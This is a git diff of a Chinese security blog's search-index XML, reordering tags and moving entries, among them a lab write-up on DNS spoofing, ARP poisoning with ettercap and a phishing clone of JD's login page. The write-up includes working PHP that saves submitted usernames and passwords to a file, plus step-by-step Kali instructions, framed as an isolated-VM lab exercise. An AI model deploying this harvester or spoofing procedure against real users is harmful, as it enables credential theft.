@@ -218,9 +218,9 @@
     
     <tags>
       
-      <tag>sql</tag>
-      
       <tag>md5</tag>
+      
+      <tag>sql</tag>
       
       <tag>php伪协议</tag>
       
@@ -231,7 +231,7 @@
   
   
   <entry>
-    <title>网安作业</title>
+    <title>网安作业1</title>
     <link href="/2020/09/27/homework/"/>
     <url>/2020/09/27/homework/</url>
     
@@ -448,9 +448,9 @@
     
     <tags>
       
-      <tag>sql</tag>
-      
       <tag>md5</tag>
+      
+      <tag>sql</tag>
       
       <tag>弱类型</tag>
       
@@ -543,9 +543,9 @@
     
     <tags>
       
-      <tag>sql</tag>
-      
       <tag>md5</tag>
+      
+      <tag>sql</tag>
       
       <tag>代码审计</tag>
       
@@ -627,25 +627,6 @@
   
   
   <entry>
-    <title>jdtest</title>
-    <link href="/2020/07/18/jdtest/"/>
-    <url>/2020/07/18/jdtest/</url>
-    
-    <content type="html"><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><a id="more"></a><p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" srcset="/img/loading.gif" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" srcset="/img/loading.gif" alt="2"></p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/7/16 14:54</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : jd.py</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> osdir = <span class="hljs-string">"jdtp"</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):    os.mkdir(dir)baseurl = <span class="hljs-string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span>head = &#123;        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>    &#125;response = requests.get(url=baseurl, headers = head)<span class="hljs-comment">#print(response.text)</span>html = response.textfindlinks = <span class="hljs-string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span><span class="hljs-comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span>urls = re.findall(findlinks, html)<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:    time.sleep(<span class="hljs-number">1</span>)    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]    res = requests.get(<span class="hljs-string">"http:"</span>+url,headers = head)    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:        f.write(res.content)</code></pre></div>]]></content>
-    
-    
-    
-    <tags>
-      
-      <tag>python</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>sqlmap</title>
     <link href="/2020/07/18/sql%E6%B3%A8%E5%85%A5/"/>
     <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
@@ -663,6 +644,25 @@
     <tags>
       
       <tag>sql</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>jdtest</title>
+    <link href="/2020/07/18/jdtest/"/>
+    <url>/2020/07/18/jdtest/</url>
+    
+    <content type="html"><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><a id="more"></a><p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" srcset="/img/loading.gif" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" srcset="/img/loading.gif" alt="2"></p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/7/16 14:54</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : jd.py</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> osdir = <span class="hljs-string">"jdtp"</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):    os.mkdir(dir)baseurl = <span class="hljs-string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span>head = &#123;        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>    &#125;response = requests.get(url=baseurl, headers = head)<span class="hljs-comment">#print(response.text)</span>html = response.textfindlinks = <span class="hljs-string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span><span class="hljs-comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span>urls = re.findall(findlinks, html)<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:    time.sleep(<span class="hljs-number">1</span>)    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]    res = requests.get(<span class="hljs-string">"http:"</span>+url,headers = head)    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:        f.write(res.content)</code></pre></div>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>python</tag>
       
     </tags>
     
@@ -700,7 +700,7 @@
     <link href="/2020/07/18/diaoyu/"/>
     <url>/2020/07/18/diaoyu/</url>
     
-    <content type="html"><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><a id="more"></a><p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="/2020/07/18/diaoyu/9.png" srcset="/img/loading.gif" alt><br>修改index.html中的内容<br><img src="/2020/07/18/diaoyu/10.png" srcset="/img/loading.gif" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$nam = stripslashes($_POST[<span class="hljs-string">'name'</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>$pas = stripslashes($_POST[<span class="hljs-string">'pass'</span>]);<span class="hljs-comment">//pass也一样</span>$content = <span class="hljs-string">"您已捕获京东账号及密码1个："</span> . <span class="hljs-string">" 用户名 "</span> . $nam . <span class="hljs-string">" 密码 "</span> . $pas;   <span class="hljs-comment">//保存捕获的用户名和密码</span>$filed = @fopen(<span class="hljs-string">"1.txt"</span>, <span class="hljs-string">"a+"</span>);   <span class="hljs-comment">//打开1.txt</span>@fwrite($filed, <span class="hljs-string">"$content\n"</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span><span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;head&gt;&lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;window.history.back() <span class="hljs-comment">//后退+刷新</span>&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=<span class="hljs-string">"goBack()"</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" srcset="/img/loading.gif" alt></p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p><p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="/2020/07/18/diaoyu/1.png" srcset="/img/loading.gif" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）" target="_blank" rel="noopener">www.jd.com看看网站发布是否成功）</a></p><h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="/2020/07/18/diaoyu/2.png" srcset="/img/loading.gif" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="/2020/07/18/diaoyu/3.png" srcset="/img/loading.gif" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问任何网页，全部指向为10.1.1.2<br>  <img src="/2020/07/18/diaoyu/4.png" srcset="/img/loading.gif" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="/2020/07/18/diaoyu/5.png" srcset="/img/loading.gif" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" srcset="/img/loading.gif" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p><h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码等，如图，然后点击登录" target="_blank" rel="noopener">www.jd.com输入用户名密码等，如图，然后点击登录</a><br><img src="/2020/07/18/diaoyu/7.png" srcset="/img/loading.gif" alt><br>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="/2020/07/18/diaoyu/8.png" srcset="/img/loading.gif" alt></p>]]></content>
+    <content type="html"><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><a id="more"></a><p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="/2020/07/18/diaoyu/9.png" srcset="/img/loading.gif" alt><br>修改index.html中的内容<br><img src="/2020/07/18/diaoyu/10.png" srcset="/img/loading.gif" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$nam = stripslashes($_POST[<span class="hljs-string">'name'</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>$pas = stripslashes($_POST[<span class="hljs-string">'pass'</span>]);<span class="hljs-comment">//pass也一样</span>$content = <span class="hljs-string">"您已捕获京东账号及密码1个："</span> . <span class="hljs-string">" 用户名 "</span> . $nam . <span class="hljs-string">" 密码 "</span> . $pas;   <span class="hljs-comment">//保存捕获的用户名和密码</span>$filed = @fopen(<span class="hljs-string">"1.txt"</span>, <span class="hljs-string">"a+"</span>);   <span class="hljs-comment">//打开1.txt</span>@fwrite($filed, <span class="hljs-string">"$content\n"</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span><span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;head&gt;&lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;window.history.back() <span class="hljs-comment">//后退+刷新</span>&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=<span class="hljs-string">"goBack()"</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" srcset="/img/loading.gif" alt></p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p><p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="/2020/07/18/diaoyu/1.png" srcset="/img/loading.gif" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）" target="_blank" rel="noopener">www.jd.com看看网站发布是否成功）</a></p><h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="/2020/07/18/diaoyu/2.png" srcset="/img/loading.gif" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="/2020/07/18/diaoyu/3.png" srcset="/img/loading.gif" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2" target="_blank" rel="noopener">www.jd.com，指向为10.1.1.2</a><br>  <img src="/2020/07/18/diaoyu/4.png" srcset="/img/loading.gif" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="/2020/07/18/diaoyu/5.png" srcset="/img/loading.gif" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" srcset="/img/loading.gif" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p><h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码等，如图，然后点击登录" target="_blank" rel="noopener">www.jd.com输入用户名密码等，如图，然后点击登录</a><br><img src="/2020/07/18/diaoyu/7.png" srcset="/img/loading.gif" alt><br>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="/2020/07/18/diaoyu/8.png" srcset="/img/loading.gif" alt></p>]]></content>
     
     
     <categories>
